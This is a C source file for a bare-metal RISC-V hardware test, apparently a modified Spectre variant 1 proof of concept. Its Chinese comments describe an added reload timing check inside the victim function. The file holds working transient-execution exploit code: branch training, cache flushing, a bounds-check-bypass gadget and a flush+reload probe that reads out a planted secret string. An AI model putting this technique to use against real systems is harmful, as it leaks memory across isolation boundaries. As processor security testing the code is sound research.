#include <klib.h> // [1]
#include "encoding.h"
#include "cache-utils.h"

/* =============================================================================
 * spectre-v1-victim-reload.c
 *
 * 这是 spectre-v1.c 的副本(不改动原文件)。按用户方案:在 victimFunc 内、
 * `if(idx<array1_sz){...}` 之后、【仍在受害者函数内】,直接加一条访存指令,
 * 照 main probe 那段的写法(xs_fence + rdcycle + array2 访存 + rdcycle + diff)
 * 测访存时延,命中(diff<threshold)就 printf。
 *
 * 测的地址 = gadget 刚(推测)访问的那条行 array2[array1[idx]*64]:
 *   - idx 合法(训练):array1[idx]∈{1..16},测 line 1-16;
 *   - idx 越界(攻击):array1[idx] 架构读到相邻 secret 字节(bare 无隔离,不 fault),
 *     测 array2[secret*64] 的延迟。
 * 这条 reload 是架构态、一定执行、不在推测态:若上面 if 里的推测那次已把该行载入
 * cache,这条 reload 命中(快)=> victim 推测确实接触/载入了 secret。
 *
 * threshold 原本只在 main 里可见,这里加全局 g_threshold,main 校准后赋值供 victim 用。
 *
 * ── 必须知道的副作用(用户已明确要这么做,此处仅如实标注,便于解读日志)──
 *   (1) 这条 reload 会【架构态】访问 array2[array1[idx]*64]。攻击调用时它架构读了
 *       secret 行 => 之后 main 的 probe 对 secret 行必然命中,expected_hits 会被这条
 *       reload 污染成"满命中",不再是纯推测泄露的证据。此版判定看 [v1-victim-reload]
 *       打印的 vdiff,不要再采信 expected_hits。
 *   (2) 严格说 secret 在此被架构态读了(array1[idx] 越界架构读),此版不再是"纯推测
 *       攻击"。这是"在 victim 内测这条访存时延"不可避免的代价。
 *   (3) victim 内没有 flush,该行一旦被这条 reload 载入就会残留热,下一次调用测到的
 *       vdiff 可能是上次残留(而非本次推测)所致。要干净归因需每次测后 flush 该行
 *       (见下方 VICTIM_RELOAD_FLUSH 开关)。
 *
 * 用法:建 tune profile 时用本文件【替换】 source/src/spectre-v1.c(勿与原文件并存
 *       编译);改 source 后按 §7.5 重算 SOURCE_TREE_SHA256。
 * ========================================================================== */

#ifndef TRAIN_TIMES
#define TRAIN_TIMES 6 // BOOM Spectre-v1 PoC uses six training iterations.
#endif
#ifndef ROUNDS
#define ROUNDS 1 // run the train + attack sequence X amount of times (for redundancy)
#endif
#ifndef ATTACK_SAME_ROUNDS
#define ATTACK_SAME_ROUNDS 10 // amount of times to attack the same index
#endif
#ifndef SECRET_SZ
#define SECRET_SZ 6
#endif
#ifndef CACHE_HIT_THRESHOLD
#define CACHE_HIT_THRESHOLD 70
#endif
#ifndef USE_FIXED_CACHE_HIT_THRESHOLD
#define USE_FIXED_CACHE_HIT_THRESHOLD 0
#endif
#ifndef FLUSH_LINES
#define FLUSH_LINES 256
#endif
#ifndef FLUSH_CANDIDATE_LINES_ONLY
#define FLUSH_CANDIDATE_LINES_ONLY 0
#endif
#ifndef FLUSH_SINGLE_CANDIDATE_IDX
#define FLUSH_SINGLE_CANDIDATE_IDX -1
#endif
#ifndef PROBE_CANDIDATES
#define PROBE_CANDIDATES 62
#endif
#ifndef PROBE_MIX_STRIDE
#define PROBE_MIX_STRIDE 17
#endif
#ifndef PROBE_MIX_BIAS
#define PROBE_MIX_BIAS 13
#endif
#ifndef PRINT_TOP_N
#define PRINT_TOP_N 8
#endif

// victim 内 reload 诊断:仅对越界(攻击)调用 printf,避免训练调用刷屏。
// idx >= VICTIM_RELOAD_ATTACK_MIN 视为攻击调用。设 0 则训练也打印。
#ifndef VICTIM_RELOAD_ATTACK_MIN
#define VICTIM_RELOAD_ATTACK_MIN 16
#endif
// 若为 1:victim 内 reload 测完立即 flush 该行,让下次测量不吃上次残留(更干净归因)。
#ifndef VICTIM_RELOAD_FLUSH
#define VICTIM_RELOAD_FLUSH 0
#endif

uint64_t array1_sz = 16;
uint8_t unused1[64];
uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t __attribute__((aligned(4096))) array2[256 * L1_BLOCK_SZ_BYTES];

char secretString[] = "S3CreT";

// main 校准后写入,victim 内 reload 诊断用它判命中(main 里另有局部 threshold)。
uint64_t g_threshold = CACHE_HIT_THRESHOLD;

static inline uint64_t candidateValue(uint64_t idx){
    if (idx < 10) return '0' + idx;
    if (idx < 36) return 'A' + (idx - 10);
    return 'a' + (idx - 36);
}

static inline uint64_t mixedCandidateIdx(uint64_t idx){
    return (idx * PROBE_MIX_STRIDE + PROBE_MIX_BIAS) % PROBE_CANDIDATES;
}

static inline void flushProbeArray(void){
#if FLUSH_SINGLE_CANDIDATE_IDX >= 0
    uint64_t mixed_i = candidateValue(FLUSH_SINGLE_CANDIDATE_IDX);
    xs_flush_cache_line(&array2[mixed_i * L1_BLOCK_SZ_BYTES]);
#elif FLUSH_CANDIDATE_LINES_ONLY
    for (uint64_t i = 0; i < PROBE_CANDIDATES; ++i){
        uint64_t mixed_i = candidateValue(mixedCandidateIdx(i));
        xs_flush_cache_line(&array2[mixed_i * L1_BLOCK_SZ_BYTES]);
    }
#else
    for (uint64_t i = 0; i < FLUSH_LINES; ++i){
        xs_flush_cache_line(&array2[i * L1_BLOCK_SZ_BYTES]);
    }
#endif
    xs_fence();
}

/**
 * reads in inArray array (and corresponding size) and outIdxArrays top two idx's (and their
 * corresponding values) in the inArray array that has the highest values.
 *
 * @input inArray array of values to find the top two maxs
 * @input inArraySize size of the inArray array in entries
 * @inout outIdxArray array holding the idxs of the top two values
 *        ([0] idx has the larger value in inArray array)
 * @inout outValArray array holding the top two values ([0] has the larger value)
 */
void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray){
    outValArray[0] = 0;
    outValArray[1] = 0;

    for (uint64_t i = 0; i < inArraySize; ++i){
        if (inArray[i] > outValArray[0]){
            outValArray[1] = outValArray[0];
            outValArray[0] = inArray[i];
            outIdxArray[1] = outIdxArray[0];
            outIdxArray[0] = i;
        }
        else if (inArray[i] > outValArray[1]){
            outValArray[1] = inArray[i];
            outIdxArray[1] = i;
        }
    }
}

static void printTopCandidates(uint64_t* results, uint64_t expected){
    uint64_t topVal[PRINT_TOP_N];
    uint8_t topIdx[PRINT_TOP_N];
    uint64_t nonzero = 0;

    for (uint64_t i = 0; i < PRINT_TOP_N; ++i){
        topVal[i] = 0;
        topIdx[i] = 0;
    }

    for (uint64_t rankIdx = 0; rankIdx < PROBE_CANDIDATES; ++rankIdx){
        uint8_t candidate = candidateValue(rankIdx);
        uint64_t val = results[candidate];
        nonzero += val != 0;

        for (uint64_t pos = 0; pos < PRINT_TOP_N; ++pos){
            if (val > topVal[pos]){
                for (int64_t shift = PRINT_TOP_N - 1; shift > (int64_t)pos; --shift){
                    topVal[shift] = topVal[shift - 1];
                    topIdx[shift] = topIdx[shift - 1];
                }
                topVal[pos] = val;
                topIdx[pos] = candidate;
                break;
            }
        }
    }

    printf("debug nonzero=%lu expected_hits=%lu top%d:", nonzero, results[expected], PRINT_TOP_N);
    for (uint64_t i = 0; i < PRINT_TOP_N; ++i){
        printf(" (%lu,%c,%d)", topVal[i], topIdx[i], topIdx[i]);
    }
    printf("\n");
}

/**
 * takes in an idx to use to access a secret array. this idx is used to read any mem addr outside
 * the bounds of the array through the Spectre Variant 1 attack.
 *
 * @input idx input to be used to idx the array
 */
uint8_t victimFunc(uint64_t idx){
    uint8_t volatile dummy = 2;

    // stall array1_sz by doing div operations (operation is (array1_sz << 4) / (2*4))
    array1_sz =  array1_sz << 4;
    asm("fcvt.s.lu	fa4, %[in]\n"
        "fcvt.s.lu	fa5, %[inout]\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fcvt.lu.s	%[out], fa5, rtz\n"
        : [out] "=r" (array1_sz)
        : [inout] "r" (array1_sz), [in] "r" (dummy)
        : "fa4", "fa5");

    if (idx < array1_sz){
        dummy = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
    }

    /* 【用户方案】仍在 victim 内、if 之后:直接加一条访存指令,照 probe 写法测时延。
     * 目标 = gadget 刚(推测)访问的同一条行 array2[array1[idx]*64]。
     * 架构态、一定执行:若上面推测那次已把该行载入 cache,这条 reload 命中(快)。 */
    {
        uint64_t vstart, vend, vdiff;
        uint8_t  vbyte = array1[idx]; // idx 越界(攻击)时架构读到 secret 字节
        xs_fence();                    // fence to correctly read CSR register as can be executed OoO
        vstart = rdcycle();

        dummy &= array2[vbyte * L1_BLOCK_SZ_BYTES];

        xs_fence();
        vend = rdcycle();
        vdiff = vend - vstart;

        if ( vdiff < g_threshold ){
            // 仅对攻击(越界)调用打印,避免训练刷屏;设 -DVICTIM_RELOAD_ATTACK_MIN=0 则全打。
            if ( idx >= VICTIM_RELOAD_ATTACK_MIN ){
                printf("[v1-victim-reload] idx=%lu vbyte=%d line=%d vdiff=%lu HIT(<%lu)\n",
                       idx, (int)vbyte, (int)vbyte, vdiff, g_threshold);
            }
        }
#if VICTIM_RELOAD_FLUSH
        // 测完 flush 该行,避免残留热污染下次调用(更干净的逐次归因)。
        xs_flush_cache_line(&array2[vbyte * L1_BLOCK_SZ_BYTES]);
        xs_fence();
#endif
    }

    // bound speculation here just in case it goes over
    dummy = rdcycle();
	return dummy; //Not used
}

int main(void){
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
	uint64_t start, end, diff, passInIdx, randIdx;
    uint8_t volatile dummy = 0;
    static uint64_t results[256];
#if USE_FIXED_CACHE_HIT_THRESHOLD
    uint64_t measured_threshold = 0;
    uint64_t threshold = CACHE_HIT_THRESHOLD;
#else
    uint64_t measured_threshold = xs_calibrate_threshold(array2, L1_BLOCK_SZ_BYTES);
    uint64_t threshold = measured_threshold;
    if (threshold == 0) {
        threshold = CACHE_HIT_THRESHOLD;
    }
#endif
    g_threshold = threshold; // 供 victim 内 reload 诊断使用

    printf("[v1] calibration fallback=%d measured=%lu threshold=%lu fixed=%d\n",
           CACHE_HIT_THRESHOLD, measured_threshold, threshold, USE_FIXED_CACHE_HIT_THRESHOLD);
    printf("[v1] reading %d bytes\n", SECRET_SZ);
    printf("[v1-victim-reload] in-victim post-if reload timing enabled (g_threshold=%lu)\n", g_threshold);

    // try to read out the secret
    for(uint64_t len = 0; len < SECRET_SZ; ++len){

        // clear results every round
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
            results[cIdx] = 0;
        }

        // run the attack on the same idx ATTACK_SAME_ROUNDS times
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
			//printf("attack round %d\n", atkRound);

#if USE_EVICTION_FLUSH
            // make sure array you read from is not in the cache by using DIY flushCache or CacheManagementOperations through flushCacheLine
            flushCache((uint64_t)array2, sizeof(array2));
#else
            flushProbeArray();
#endif
            xs_fence();

            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
                // bit twiddling to set passInIdx=randIdx or to attackIdx after TRAIN_TIMES iterations
                // avoid jumps in case those tip off the branch predictor
                // note: randIdx changes everytime the atkRound changes so that the tally does not get affected
                //       training creates a false hit in array2 for that array1 value (you want this to be ignored by having it changed)
                randIdx = (atkRound * 7 + len * 3 + 1) % array1_sz;
                passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
                passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx

                // set of constant takens to make the BHR be in a all taken state
                for(uint64_t k = 0; k < 30; ++k){
                    asm("");
                }

                // call function to train or attack
                victimFunc(passInIdx);
            }

            // read out array 2 and see the hit secret value
            // this is also assuming there is no prefetching
            for (uint64_t i = 0; i < PROBE_CANDIDATES; ++i){
                uint64_t mixed_i = candidateValue(mixedCandidateIdx(i));
				xs_fence(); // fence to correctly read CSR register as can be executed OoO
                start = rdcycle();

                dummy &= array2[mixed_i * L1_BLOCK_SZ_BYTES];

				xs_fence();
				end = rdcycle();

                diff = end - start;
				//printf("diff %d\n", diff);
                if ( diff < threshold ){
                    results[mixed_i] += 1;
                }
            }
			//printf("diff %d, %lu\n", diff, start);
        }

        // get highest and second highest result hit values
        uint8_t output[2];
        uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);

        printf("m[0x%p] = want(%c) =?= guess(hits,char) 1.(%lu, %c) 2.(%lu, %c)\n", (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], hitArray[1], output[1]);
        printf("debug expected_dec=%d guess1_dec=%d hits1=%lu guess2_dec=%d hits2=%lu expected_hits=%lu\n",
               (int)(uint8_t)secretString[len], (int)output[0], hitArray[0],
               (int)output[1], hitArray[1], results[(uint8_t)secretString[len]]);
        printTopCandidates(results, (uint8_t)secretString[len]);
        //printf("want(%c) =?= guess 1.(%c) 2.(%c)\n", secretString[len], output[0], output[1]);

        // read in the next secret
        ++attackIdx;
    }

    return 0;
}
